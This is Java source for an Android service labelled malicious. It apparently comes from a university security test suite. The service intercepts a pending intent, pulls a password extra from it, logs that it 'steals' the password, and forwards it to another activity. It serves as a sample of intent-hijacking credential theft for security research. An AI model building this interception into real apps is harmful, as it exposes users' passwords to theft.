package edu.ksu.cs.malicious;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

public class MalService extends Service {
    public MalService() {
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d("Malicious...", "Malicious service intercepted the pending intent");
        String password = intent.getStringExtra("password");
        startActivity(new Intent(getApplicationContext(), MalActivity.class)
                .putExtra("pwd", password)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
        Log.d("Malicious...", "Malicious service steals " + password);
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public IBinder onBind(Intent intent) {
        
        throw new UnsupportedOperationException("Not yet implemented");
    }
}
